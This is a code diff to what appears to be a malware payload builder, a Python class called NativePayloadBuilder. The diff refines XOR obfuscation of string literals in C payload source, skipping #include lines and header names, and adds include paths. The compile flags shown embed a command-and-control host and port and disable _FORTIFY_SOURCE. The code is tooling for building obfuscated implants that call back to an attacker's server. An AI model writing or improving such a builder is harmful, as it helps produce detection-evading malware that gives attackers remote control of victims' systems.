@@ -39,10 +39,22 @@ class NativePayloadBuilder:
         import re
         
         def xor_string(match):
+            full_match = match.group(0)
             string = match.group(1)
+            
+            # NEVER obfuscate strings in #include statements
+            line_start = source_code.rfind('\n', 0, match.start()) + 1
+            line = source_code[line_start:match.start()]
+            if '#include' in line:
+                return full_match
+            
             # Skip certain strings that shouldn't be obfuscated
-            if string in ['%d', '%s', '%x', '\\n', '\\r', '\\t']:
-                return match.group(0)
+            if string in ['%d', '%s', '%x', '\\n', '\\r', '\\t', '']:
+                return full_match
+            
+            # Skip if it looks like a header file
+            if string.endswith('.h') or string.endswith('.c'):
+                return full_match
             
             # XOR encrypt the string
             encrypted = []
@@ -52,7 +64,7 @@ class NativePayloadBuilder:
             # Return obfuscated string with deobfuscation code
             return f'DEOBF("{{"{"".join(encrypted)}"}}", {xor_key})'
         
-        # Find and replace string literals
+        # Find and replace string literals (but not in preprocessor directives)
         pattern = r'"([^"\\]*(\\.[^"\\]*)*)"'
         return re.sub(pattern, xor_string, source_code)
     
@@ -189,6 +201,9 @@ static int {func_name}(int x) {{
             "-D_FORTIFY_SOURCE=0",
             f"-DSERVER_HOST=\"{config.get('c2_host', 'localhost')}\"",
             f"-DSERVER_PORT={config.get('c2_port', 4433)}",
+            "-I" + str(self.base_path / "core"),
+            "-I" + str(self.base_path / "crypto"),
+            "-I" + str(self.base_path / "network"),
         ]
         
         # Platform-specific flags
